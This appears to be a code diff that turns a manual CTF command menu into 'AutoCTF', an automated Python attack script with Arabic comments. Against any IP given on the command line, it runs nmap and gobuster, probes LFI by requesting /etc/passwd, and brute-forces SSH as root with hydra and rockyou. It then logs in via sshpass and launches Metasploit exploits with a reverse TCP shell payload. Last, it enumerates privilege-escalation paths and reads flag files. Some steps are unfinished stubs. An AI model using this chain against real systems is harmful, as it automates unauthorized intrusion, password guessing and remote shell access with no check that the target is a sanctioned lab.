@@ -1,18 +1,17 @@
 #!/usr/bin/env python3
 # ==========================================
-# CTF-EXECUTOR - واجهة تنفيذ الأوامر فقط
-# بدون توجيه أو اقتراحات - المستخدم يقرر
+# AutoCTF - Solver آلي كامل للوصول إلى العلم
 # ==========================================
 
 import os
 import sys
+import time
+import subprocess
+import re
 import json
 import datetime
-import subprocess
-import readline
-from typing import Dict, List
+import tempfile
 
-# ================= الإعدادات =================
 class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
@@ -23,237 +22,274 @@ class Colors:
     BOLD = '\033[1m'
     ENDC = '\033[0m'
 
-# ================= إدارة الجلسات =================
-class Session:
-    def __init__(self, target: str = None):
+class AutoCTF:
+    def __init__(self, target):
         self.target = target
-        self.commands = []  # سجل الأوامر المنفذة
-        self.start_time = datetime.datetime.now().isoformat()
+        self.ports = []
+        self.services = {}
+        self.web_dirs = []
+        self.shell = None
+        self.flag = None
+        self.log = []
     
-    def add_command(self, cmd: str, output: str):
-        self.commands.append({
-            "time": datetime.datetime.now().isoformat(),
-            "command": cmd,
-            "output": output
-        })
+    def log_step(self, message):
+        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
+        self.log.append(f"[{timestamp}] {message}")
+        print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
     
-    def save(self, filename: str = None):
-        if not filename:
-            filename = f"session_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(filename, 'w') as f:
-            json.dump({
-                "target": self.target,
-                "start_time": self.start_time,
-                "commands": self.commands
-            }, f, indent=2)
-        print(f"{Colors.GREEN}💾 تم حفظ الجلسة في {filename}{Colors.ENDC}")
-        return filename
-    
-    @staticmethod
-    def load(filename: str):
-        with open(filename, 'r') as f:
-            data = json.load(f)
-        session = Session(data.get('target'))
-        session.start_time = data['start_time']
-        session.commands = data['commands']
-        return session
-
-# ================= تنفيذ الأوامر =================
-def run_command(cmd: str) -> str:
-    """تنفيذ أمر وعودة الناتج"""
-    try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-        return result.stdout + result.stderr
-    except Exception as e:
-        return f"خطأ في تنفيذ الأمر: {e}"
-
-def execute_and_log(session: Session, cmd: str):
-    """تنفيذ الأمر وعرض النتيجة وتسجيلها في الجلسة"""
-    print(f"{Colors.GREEN}▶ تنفيذ: {cmd}{Colors.ENDC}")
-    output = run_command(cmd)
-    print(output)
-    session.add_command(cmd, output)
-
-# ================= قائمة الأدوات =================
-def show_menu():
-    print(f"\n{Colors.BOLD}📋 قائمة الأدوات المتاحة:{Colors.ENDC}")
-    print("  1. Nmap - فحص المنافذ")
-    print("  2. Gobuster - اكتشاف الدلائل")
-    print("  3. Searchsploit - البحث عن استغلالات")
-    print("  4. Hydra - هجوم قاموس")
-    print("  5. Curl - طلبات HTTP")
-    print("  6. Netcat - اتصال بالخدمات")
-    print("  7. Msfconsole - تشغيل Metasploit")
-    print("  8. Nikto - فحص ثغرات الويب")
-    print("  9. Wfuzz - اختبار المعاملات")
-    print("  10. Dirb - فحص الدلائل")
-    print("  11. Sqlmap - اختبار SQL injection")
-    print("  12. John the Ripper - كسر التجزئة")
-    print("  13. تنفيذ أمر مخصص")
-    print("  14. حفظ الجلسة")
-    print("  15. عرض سجل الأوامر")
-    print("  0. إنهاء")
-
-def handle_choice(session: Session, choice: str):
-    if choice == '1':  # Nmap
-        target = session.target if session.target else input("أدخل الهدف (IP/URL): ").strip()
-        if not session.target:
-            session.target = target
-        options = input("خيارات إضافية (مثل -sC -sV): ").strip()
-        cmd = f"nmap {options} {target}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '2':  # Gobuster
-        url = input("URL الهدف (مثال: http://example.com): ").strip()
-        wordlist = input("مسار قائمة الكلمات (افتراضي: /usr/share/wordlists/dirb/common.txt): ").strip()
-        if not wordlist:
-            wordlist = "/usr/share/wordlists/dirb/common.txt"
-        options = input("خيارات إضافية: ").strip()
-        cmd = f"gobuster dir -u {url} -w {wordlist} {options}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '3':  # Searchsploit
-        query = input("أدخل اسم الخدمة أو الإصدار: ").strip()
-        cmd = f"searchsploit {query}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '4':  # Hydra
-        service = input("الخدمة (ssh/ftp/http-post-form...): ").strip()
-        target = input("الهدف: ").strip()
-        user = input("اسم المستخدم (أو -L لملف): ").strip()
-        password = input("كلمة المرور (أو -P لملف): ").strip()
-        options = input("خيارات إضافية (مثل -t 4): ").strip()
-        cmd = f"hydra -l {user} -p {password} {service}://{target} {options}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '5':  # Curl
-        url = input("URL: ").strip()
-        options = input("خيارات إضافية (مثل -I): ").strip()
-        cmd = f"curl {options} {url}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '6':  # Netcat
-        target = input("الهدف: ").strip()
-        port = input("المنفذ: ").strip()
-        mode = input("وضع (connect/listen): ").strip().lower()
-        if mode.startswith('c'):
-            cmd = f"nc {target} {port}"
-        else:
-            cmd = f"nc -lvnp {port}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '7':  # Msfconsole
-        resource = input("ملف أوامر (اختياري): ").strip()
-        if resource:
-            cmd = f"msfconsole -r {resource}"
-        else:
-            cmd = "msfconsole"
-        execute_and_log(session, cmd)
-    
-    elif choice == '8':  # Nikto
-        target = input("الهدف: ").strip()
-        options = input("خيارات إضافية: ").strip()
-        cmd = f"nikto -h {target} {options}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '9':  # Wfuzz
-        url = input("URL (استخدم FUZZ كمكان للاختبار): ").strip()
-        wordlist = input("مسار قائمة الكلمات: ").strip()
-        options = input("خيارات إضافية: ").strip()
-        cmd = f"wfuzz -w {wordlist} {options} {url}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '10':  # Dirb
-        url = input("URL: ").strip()
-        wordlist = input("قائمة كلمات (افتراضي: common.txt): ").strip()
-        if wordlist:
-            cmd = f"dirb {url} {wordlist}"
-        else:
-            cmd = f"dirb {url}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '11':  # Sqlmap
-        url = input("URL مع معامل (مثال: http://site.com/page.php?id=1): ").strip()
-        options = input("خيارات إضافية: ").strip()
-        cmd = f"sqlmap -u {url} {options}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '12':  # John the Ripper
-        hash_file = input("ملف التجزئة: ").strip()
-        wordlist = input("قائمة كلمات (اختياري): ").strip()
-        if wordlist:
-            cmd = f"john --wordlist={wordlist} {hash_file}"
-        else:
-            cmd = f"john {hash_file}"
-        execute_and_log(session, cmd)
-    
-    elif choice == '13':  # أمر مخصص
-        cmd = input("أدخل الأمر كاملاً: ").strip()
-        if cmd:
-            execute_and_log(session, cmd)
-    
-    elif choice == '14':  # حفظ الجلسة
-        filename = input("اسم الملف (اترك فارغاً لاسم تلقائي): ").strip()
-        session.save(filename if filename else None)
-    
-    elif choice == '15':  # عرض سجل الأوامر
-        print(f"\n{Colors.BOLD}📜 سجل الأوامر ({len(session.commands)} أمر):{Colors.ENDC}")
-        for i, cmd in enumerate(session.commands, 1):
-            print(f"{i}. {cmd['time']}: {cmd['command'][:80]}...")
-    
-    elif choice == '0':
-        return False
-    else:
-        print(f"{Colors.FAIL}اختيار غير صالح.{Colors.ENDC}")
-    return True
-
-# ================= الواجهة الرئيسية =================
-def main():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print(f"{Colors.HEADER}{Colors.BOLD}")
-    print("╔════════════════════════════════════════════════════════════╗")
-    print("║        🔧 CTF-EXECUTOR - واجهة تنفيذ الأوامر فقط         ║")
-    print("║          بدون توجيه - المستخدم هو من يقرر الخطوات        ║")
-    print("╚════════════════════════════════════════════════════════════╝")
-    print(Colors.ENDC)
-    
-    print("\n1. بدء جلسة جديدة")
-    print("2. استئناف جلسة محفوظة")
-    print("3. خروج")
-    choice = input(f"{Colors.CYAN}اختر: {Colors.ENDC}").strip()
-    
-    session = None
-    if choice == '1':
-        target = input("📍 IP الهدف أو URL (اختياري): ").strip()
-        session = Session(target if target else None)
-        print(f"{Colors.GREEN}✅ بدأت جلسة جديدة.{Colors.ENDC}")
-    elif choice == '2':
-        filename = input("📁 اسم ملف الجلسة: ").strip()
+    def run_command(self, cmd):
+        self.log_step(f"تنفيذ: {cmd}")
         try:
-            session = Session.load(filename)
-            print(f"{Colors.GREEN}✅ تم تحميل الجلسة. الهدف: {session.target}{Colors.ENDC}")
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+            return result.stdout + result.stderr
+        except subprocess.TimeoutExpired:
+            return "انتهت المهلة"
         except Exception as e:
-            print(f"{Colors.FAIL}خطأ في تحميل الجلسة: {e}{Colors.ENDC}")
+            return f"خطأ: {e}"
+    
+    def nmap_scan(self):
+        self.log_step("بدء فحص Nmap")
+        output = self.run_command(f"nmap -sC -sV -p- --min-rate=1000 {self.target}")
+        # استخراج المنافذ المفتوحة والخدمات
+        for line in output.splitlines():
+            m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
+            if m:
+                port = m.group(1)
+                service = m.group(2)
+                self.ports.append(port)
+                self.services[port] = service
+        self.log_step(f"المنافذ المفتوحة: {self.ports}")
+        self.log_step(f"الخدمات: {self.services}")
+        return output
+    
+    def web_enum(self):
+        if '80' not in self.services and '443' not in self.services:
+            self.log_step("لا توجد خدمة ويب، تخطي تعداد الدلائل")
             return
-    else:
-        print("مع السلامة!")
-        return
+        port = '80' if '80' in self.services else '443'
+        protocol = 'http' if port == '80' else 'https'
+        url = f"{protocol}://{self.target}"
+        self.log_step(f"بدء تعداد الدلائل على {url}")
+        # استخدام gobuster
+        wordlist = "/usr/share/wordlists/dirb/common.txt"
+        output = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50")
+        # استخراج الدلائل التي تعيد 200
+        dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', output)
+        self.web_dirs = dirs
+        self.log_step(f"الدلائل المكتشفة: {self.web_dirs}")
+        return output
     
-    # حلقة القائمة الرئيسية
-    while True:
-        show_menu()
-        user_choice = input(f"{Colors.CYAN}اختر أداة: {Colors.ENDC}").strip()
-        if not handle_choice(session, user_choice):
-            break
+    def check_lfi(self):
+        for dir in self.web_dirs:
+            if 'index' in dir or 'admin' in dir or 'include' in dir:
+                self.log_step(f"محاولة LFI في {dir}")
+                # اختبار LFI بسيط
+                test_url = f"http://{self.target}/{dir}/?page=../../../../etc/passwd"
+                out = self.run_command(f"curl -s {test_url}")
+                if "root:" in out:
+                    self.log_step(f"وجدنا LFI في {test_url}")
+                    return test_url
+        return None
     
-    # حفظ تلقائي عند الخروج
-    if ask_yes_no("هل تريد حفظ الجلسة قبل الخروج؟"):
-        session.save()
-    print(f"{Colors.GREEN}👋 انتهت الجلسة.{Colors.ENDC}")
-
-def ask_yes_no(question: str) -> bool:
-    answer = input(f"{Colors.CYAN}❓ {question} (y/n): {Colors.ENDC}").strip().lower()
-    return answer.startswith('y')
+    def check_upload(self):
+        for dir in self.web_dirs:
+            if 'upload' in dir:
+                self.log_step(f"محاولة استغلال رفع ملفات في {dir}")
+                # محاولة رفع شيل بسيط (يحتاج إلى تحليل أكثر تعقيداً)
+                # هنا نكتفي بالإشارة
+                return f"http://{self.target}/{dir}"
+        return None
+    
+    def exploit_web(self):
+        lfi = self.check_lfi()
+        if lfi:
+            # قراءة الملفات الحساسة
+            pass
+        upload = self.check_upload()
+        if upload:
+            self.log_step("صفحة رفع ملفات موجودة، يمكن محاولة رفع شيل")
+            # يمكن إضافة كود لرفع شيل آلياً
+        # يمكن إضافة المزيد من الفحوصات مثل SQLi, XSS...
+    
+    def search_exploit(self, service, version=""):
+        self.log_step(f"البحث عن استغلال لـ {service} {version}")
+        output = self.run_command(f"searchsploit {service} {version}")
+        # تحليل النتائج واختيار أول استغلال
+        lines = output.splitlines()
+        exploits = []
+        for line in lines:
+            if 'exploits/' in line:
+                parts = line.split('|')
+                if len(parts) >= 2:
+                    exploits.append(parts[1].strip())
+        if exploits:
+            self.log_step(f"وجدنا استغلالات: {exploits[0]}")
+            return exploits[0]
+        else:
+            return None
+    
+    def try_exploit(self, exploit_name, port):
+        self.log_step(f"محاولة تشغيل الاستغلال {exploit_name} على المنفذ {port}")
+        # هذا الجزء يعتمد على نوع الاستغلال (يدوي أو metasploit)
+        # نفترض أن الاستغلال من نوع metasploit
+        # يمكن تشغيل msfconsole بأوامر مساعدة
+        rc_file = tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False)
+        rc_file.write(f"use {exploit_name}\n")
+        rc_file.write(f"set RHOSTS {self.target}\n")
+        rc_file.write(f"set RPORT {port}\n")
+        rc_file.write("set PAYLOAD generic/shell_reverse_tcp\n")
+        rc_file.write("set LHOST tun0\n")  # يجب تغييرها حسب الواجهة
+        rc_file.write("set LPORT 4444\n")
+        rc_file.write("exploit -j\n")
+        rc_file.close()
+        output = self.run_command(f"msfconsole -q -r {rc_file.name}")
+        os.unlink(rc_file.name)
+        # هنا يجب التحقق من نجاح الاستغلال (مثلاً بفحص الاتصال)
+        # سنفترض أنه نجح إذا ظهرت جلسة
+        if "Meterpreter session" in output or "Command shell session" in output:
+            self.log_step("الاستغلال نجح!")
+            return True
+        return False
+    
+    def brute_force_ssh(self):
+        if '22' not in self.services:
+            return False
+        self.log_step("بدء هجوم قاموس على SSH")
+        wordlist = "/usr/share/wordlists/rockyou.txt"
+        # اختصاراً، نستخدم المستخدم root
+        output = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target} -t 4 -o hydra_result.txt")
+        with open('hydra_result.txt') as f:
+            data = f.read()
+        m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
+        if m:
+            user, pwd = m.groups()
+            self.log_step(f"وجدنا بيانات: {user}:{pwd}")
+            return (user, pwd)
+        return None
+    
+    def get_shell_via_ssh(self, creds):
+        user, pwd = creds
+        self.log_step("محاولة الاتصال عبر SSH")
+        # يمكن استخدام paramiko أو subprocess مع sshpass
+        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{self.target} 'whoami'"
+        output = self.run_command(cmd)
+        if user in output:
+            self.log_step("اتصال SSH ناجح")
+            # الآن لدينا شيل
+            self.shell = f"ssh {user}@{self.target}"
+            return True
+        return False
+    
+    def privesc_linux(self):
+        self.log_step("بدء رفع الصلاحيات على لينكس")
+        # بعد الحصول على شيل، ننفذ أوامر لجمع المعلومات
+        commands = [
+            "whoami",
+            "id",
+            "uname -a",
+            "sudo -l",
+            "find / -perm -4000 -type f 2>/dev/null",
+            "cat /etc/passwd",
+            "crontab -l",
+            "ls -la /home",
+            "ls -la /root"
+        ]
+        for cmd in commands:
+            # تنفيذ عبر ssh إذا كان متاحاً
+            if self.shell:
+                full_cmd = f"ssh {self.shell.split()[-1]} '{cmd}'"
+                out = self.run_command(full_cmd)
+                self.log_step(f"نتيجة {cmd}:\n{out[:200]}")
+                # تحليل النتائج
+                if 'sudo' in out and 'NOPASSWD' in out:
+                    self.log_step("يمكن استغلال sudo")
+                if '4000' in out:
+                    self.log_step("لدينا SUID binaries، تحقق من GTFOBins")
+        # محاولة استغلال شائع مثل CVE-2021-3156 (sudo Baron Samedit)
+        # هذا يتطلب تنزيل كود استغلال وتنفيذه
+        self.log_step("محاولة استغلال sudoedit")
+        # ... يمكن إضافة كود استغلال
+    
+    def search_flag(self):
+        self.log_step("البحث عن العلم")
+        locations = [
+            "/root/flag.txt",
+            "/root/flag",
+            "/home/*/flag.txt",
+            "/home/*/flag",
+            "/flag.txt",
+            "/flag",
+            "/var/www/flag.txt",
+            "/tmp/flag"
+        ]
+        for loc in locations:
+            if self.shell:
+                out = self.run_command(f"ssh {self.shell.split()[-1]} 'cat {loc}' 2>/dev/null")
+                if out and not "No such file" in out:
+                    self.flag = out.strip()
+                    self.log_step(f"وجدنا العلم في {loc}: {self.flag}")
+                    return True
+        return False
+    
+    def run(self):
+        self.log_step("بدء الهجوم التلقائي على " + self.target)
+        
+        # 1. فحص Nmap
+        self.nmap_scan()
+        
+        # 2. إذا كان ويب، تعداد دلائل واستغلال
+        if '80' in self.services or '443' in self.services:
+            self.web_enum()
+            self.exploit_web()
+        
+        # 3. محاولة استغلال الخدمات الأخرى
+        for port, service in self.services.items():
+            if service == 'ssh':
+                # محاولة هجوم قاموس أولاً
+                creds = self.brute_force_ssh()
+                if creds:
+                    if self.get_shell_via_ssh(creds):
+                        break
+                else:
+                    # البحث عن استغلال
+                    exploit = self.search_exploit('openssh')
+                    if exploit:
+                        if self.try_exploit(exploit, port):
+                            break
+            elif service in ['ftp', 'smb']:
+                # محاولة anonymous
+                pass
+            elif service in ['http', 'https']:
+                continue  # تم التعامل معه
+            else:
+                # محاولة استغلال عام
+                exploit = self.search_exploit(service)
+                if exploit:
+                    self.try_exploit(exploit, port)
+        
+        # 4. إذا حصلنا على شيل، نبدأ رفع الصلاحيات والبحث عن العلم
+        if self.shell:
+            self.privesc_linux()
+            self.search_flag()
+        else:
+            self.log_step("لم نتمكن من الحصول على شيل. انتهى.")
+        
+        # 5. عرض النتائج
+        print(f"\n{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
+        if self.flag:
+            print(f"{Colors.BOLD}FLAG: {self.flag}{Colors.ENDC}")
+        else:
+            print("لم نعثر على العلم.")
+        
+        # حفظ السجل
+        with open("autoctf_log.txt", "w") as f:
+            f.write("\n".join(self.log))
+        print(f"{Colors.CYAN}تم حفظ السجل في autoctf_log.txt{Colors.ENDC}")
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) < 2:
+        print("استخدام: python3 autoctf.py <target_ip>")
+        sys.exit(1)
+    target = sys.argv[1]
+    agent = AutoCTF(target)
+    agent.run()
